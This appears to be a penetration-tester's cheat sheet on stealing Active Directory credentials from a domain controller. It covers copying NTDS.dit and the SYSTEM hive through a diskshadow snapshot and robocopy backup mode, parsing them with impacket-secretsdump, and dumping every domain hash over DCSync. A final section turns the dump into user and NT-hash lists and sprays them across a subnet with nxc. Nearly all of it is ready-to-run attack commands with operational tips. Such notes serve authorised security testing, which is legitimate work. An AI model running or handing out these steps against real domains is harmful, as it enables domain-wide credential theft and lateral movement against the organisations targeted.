# AD credential access

DC database and replication. Local SAM / LSA / LSASS on a Windows foothold → [windows/credential-access](../windows/credential-access.md).

## DC database or replication
| Path | Prerequisite |
| --- | --- |
| Offline NTDS | DC database copy + matching SYSTEM hive |
| Snapshot (VSS) | Local admin / snapshot rights on the DC, VSS provider, right volume |
| Backup-mode copy | `SeBackupPrivilege` + a tool requesting backup semantics |
| DCSync | Replication rights on the domain root + reachable DRSUAPI |

- `SeBackupPrivilege` alone doesn't give permission to create a snapshot. The DC's local SAM ≠ NTDS.

## Snapshot and offline analysis
Check paths first (NTDS defaults to `C:\Windows\NTDS`, an unused `X:` drive is needed).

```cmd
whoami /priv
vssadmin list shadows
vssadmin list writers
mkdir C:\Temp\Ntds
```
`C:\Temp\Ntds\snapshot.dsh`:
```text
set context persistent
set metadata C:\Temp\Ntds\metadata.cab
add volume C: alias ntds
create
expose %ntds% X:
```
```cmd
diskshadow /s C:\Temp\Ntds\snapshot.dsh
robocopy /b X:\Windows\NTDS C:\Temp\Ntds ntds.dit
robocopy /b X:\Windows\System32\config C:\Temp\Ntds SYSTEM
dir C:\Temp\Ntds\ntds.dit C:\Temp\Ntds\SYSTEM
```
```bash
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```
```text
delete shadows id <SHADOW-ID>
exit
```
- Robocopy codes < 8 are not errors, but `0` = nothing copied: check the file size.
- Dirty / nondefault database may need recovery before parsing.
- Delete only the shadow you created (run inside `diskshadow`; never `delete shadows all`).

## DCSync: inspect rights and select the account
Confirm Get-Changes + Get-Changes-All (or equivalent) with [PowerView domain-root ACL checks](powerview.md#dcsync-rights), incl. group memberships and deny entries. Local admin on a host ≠ replication rights.

```bash
impacket-secretsdump -dc-ip <DC-IP> -just-dc-user <TARGET-USER> '<DOMAIN.TLD>/<USER>:<PW>@<DC-FQDN>'
impacket-secretsdump -dc-ip <DC-IP> -just-dc '<DOMAIN.TLD>/<USER>:<PW>@<DC-FQDN>'
impacket-secretsdump -dc-ip <DC-IP> -just-dc-ntlm '<DOMAIN.TLD>/<USER>:<PW>@<DC-FQDN>'
```
- `-just-dc-user` limits output but doesn't bypass missing rights. `-just-dc` = all secrets, `-just-dc-ntlm` = NT hashes only.
- Use recovered NT / AES keys in [lateral-movement](lateral-movement.md) or [tickets](tickets.md).
- If an object-rights path gave you the replication ACL temporarily, restore the original ACL.

## DCSync dump → user / NT lists for reuse
```bash
impacket-secretsdump -dc-ip <DC-IP> -just-dc-ntlm -outputfile dcsync '<DOMAIN.TLD>/<USER>:<PW>@<DC-FQDN>'
grep -v '\$:' dcsync.ntds | cut -d: -f1 | sed 's/.*\\//' > dc_users.txt
grep -v '\$:' dcsync.ntds | cut -d: -f4 > dc_nt.txt
nxc smb <SUBNET> -u dc_users.txt -H dc_nt.txt --no-bruteforce --continue-on-success
```
- `-outputfile X` writes `X.ntds` as `DOMAIN\user:RID:LM:NT:::`; `grep -v '\$:'` drops machine accounts.
- `--no-bruteforce` pairs line N with line N: don't sort or dedupe either file. Other spray options: [online-logins.md](../passwords/online-logins.md).
